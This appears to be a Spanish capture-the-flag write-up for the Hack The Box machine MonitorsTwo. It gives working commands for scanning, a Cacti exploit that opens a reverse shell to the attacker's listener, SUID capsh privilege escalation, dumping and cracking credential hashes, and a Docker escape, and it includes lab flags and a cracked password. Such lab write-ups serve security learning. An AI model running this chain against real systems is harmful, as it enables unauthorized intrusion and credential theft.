---
title: MonitorsTwo HTB
date: 2023-07-12
tier: easy
author: naibu3
---

## Reconocimiento

Como siempre comenzamos lanzando [[nmap]], para tratar de buscar puertos abiertos:

```bash
sudo nmap -sS -p- --open --min-rate 5000 -n -Pn 10.10.11.211
```
```nmap
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora buscamos versiones y más información:

```bash
sudo nmap -sCV -p22,80 10.10.11.211
```
```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como parece que la explotación irá via web, podemos ir lanzando el script `http-enum` de [[nmap]]:

```bash
sudo nmap --script http-enum -p80 10.10.11.211
```
```nmap
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /docs/: Potentially interesting folder
```

Si accedemos a la web, veremos una pestaña de login de un servicio llamado **Cacti**, vemos también un número de versión, la **1.2.22**. Con una breve búsqueda en internet vemos que:

> Cacti es una completa solución de gráficos, monitoreo de redes y recopilación de datos que aprovecha el poder de RRDtool. Con la herramienta Cacti puedes sondear servicios a intervalos predeterminados y hacer gráficas con los datos resultantes.

Si buscamos junto a la versión, encontraremos que resulta ser vulnerable, además de un [repositorio](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22) con un exploit en [[python 1]].

## Explotación

Si nos ponemos en escucha y lo ejecutamos:

```bash
nc -lvnp 39393
```

```bash
python3 exploit.py -u http://10.10.11.211 --LHOST=10.10.16.53 --LPORT=39393
```

Nos devolverá la conexión y obtendremos una shell:

```bash
bash-5.1$ whoami
whoami
www-data
```

Ahora podremos aplicar un [[Tratamiento de la tty]] para hacer más cómodo el reconocimiento del equipo ([[Reconocimiento del equipo]]). 

## Escalada de privilegios (Docker)

Como hemos visto, estamos bajo el usuario **www-data**, para tratar de listar usuarios podemos echar un vistazo al **/etc/passwd**, sobre el que tenemos permisos de lectura:

```passwd
root:x:0:0:root:/root:/bin/bash
[...]
```

En el que parece que el único usuario válido es **root**. Si ademś intentamos hacer un `echo $HOSTNAME`, nos dirá que es *50bca5e748b0*, lo que apunta a que la aplicación corre sobre un contenedor en [[Docker 1]]. Además, no está instalado *sudo* ni ningún editor.

Si comprobamos los **permisos SUID**:

```bash
find / -perm -4000 2>/dev/null
```
```find
[...]
/usr/bin/newgrp
/sbin/capsh
/bin/mount
[...]
```

Vemos que extrañamente **/sbin/capsh** tiene permisos SUID, si lo buscamos en [gtfobins](https://gtfobins.github.io/gtfobins/capsh/), vemos que podemos utilizarlo para convertirnos en **root**:

```bash
capsh --gid=0 --uid=0 --
```
```bash
root@50bca5e748b0:/var/www# whoami
root
```

Una vez como root, podemos leer el archivo **entrypoint.sh** de la raíz, donde vemos que se realizan conexiones a una base de datos:

```bash
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
```

Si tratamos de ejecutar la siguiente línea `mysql --host=db --user=root --password=root cacti -e "show tables"`, veremos las tablas de la BD, donde nos llama la atención la tabla **user_auth**. Cambiamos la query para ver su contenido: 

```bash
mysql --host=db --user=root --password=root cacti -e "SELECT username,password FROM user_auth"
```
```user_auth
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
| guest    | 43e9a4ab75570f5b                                             |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----------+--------------------------------------------------------------+
```

Ahora tenemos varias contraseñas hasheadas. Pero podemos romper la del usuario **marcus** con [[hashcat 1]]:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```
```hashcat
[...]
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
[...]
```

Y ya tenemos credenciales para acceder por [[22-ssh]] (`marcus:funkymonkey`). Ya tenemos la **flag de usuario** (`a72d202358018ed22b191030c3109366`).

## Escalada de privilegios

Una vez dentrode la máquina no encontramos nada sospechoso, salvo porque la versión de [[Docker 1]] es antigua. Tras una búsqueda por internet, descubrimos que es vulnerable y nos permite escalar privilegios, además encontramos un exploit en el siguiente [repo](https://github.com/UncleJ4ck/CVE-2021-41091).

Seguimos las instrucciones, asignando privilegios a la bash del contenedor del que escapamos antes, y ejecutamos el script, introducimos *yes*, y ya somos **root**. 

Ya has resuleto la máquina (`a27ca576dbee82997c0c0bfaf769249b`)!